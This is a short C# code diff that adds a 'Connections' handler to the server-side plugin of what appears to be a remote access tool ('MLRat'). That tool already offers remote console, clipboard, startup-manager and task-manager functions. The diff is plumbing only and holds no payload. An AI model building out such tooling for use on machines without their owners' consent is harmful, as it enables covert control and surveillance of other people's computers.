@@ -40,6 +40,7 @@ namespace MLManagementServer
             ConsoleHandler.Disconnect(client);
             ClipboardHandler.Disconnect(client);
             StartupManagerhandler.Disconnect(client);
+            ConnectionsHandler.Disconnect(client);
         }
 
         public void OnDataRetrieved(IClient client, object[] data)
@@ -58,6 +59,7 @@ namespace MLManagementServer
             if (command == NetworkCommand.Console) ConsoleHandler.Handle(client, data);
             if (command == NetworkCommand.Clipboard) ClipboardHandler.Handle(client, data);
             if (command == NetworkCommand.StartupManager) StartupManagerhandler.Handle(client, data);
+            if (command == NetworkCommand.Connections) ConnectionsHandler.Handle(client, data);
         }
 
         public void OnPluginLoad(IServerUIHandler UIHost)
@@ -65,6 +67,7 @@ namespace MLManagementServer
             MUIHost = UIHost;
             FileExplorerHandler.SetUIHost(UIHost);
             TaskManagerHandler.SetUIHost(UIHost);
+            ConnectionsHandler.SetUIHost(UIHost);
             UIHost.Log("MLManagement loaded!", System.Drawing.Color.Green);
 
             PingHandler.Column = UIHost.AddColumn("Ping", "-");
@@ -87,6 +90,7 @@ namespace MLManagementServer
                 new MLRatContextEntry() {Text = "Startup Manager", OnClick = StartupManagerhandler.ContextCallback, Icon="system_time.png" },
                 new MLRatContextEntry() { Text = "Task Manager", OnClick = TaskManagerHandler.ContextCallback, Icon="list.png" },
                 new MLRatContextEntry() { Text = "Clipboard", OnClick = ClipboardHandler.ContextCallback, Icon="clipboard.png" },
+                new MLRatContextEntry() { Text = "Connections", OnClick = ConnectionsHandler.ContextCallback, Icon="connections.png" },
                 new MLRatContextEntry() { Text = "Console", OnClick = ConsoleHandler.ContextCallback, Icon="cmd.png" },
                 
             };
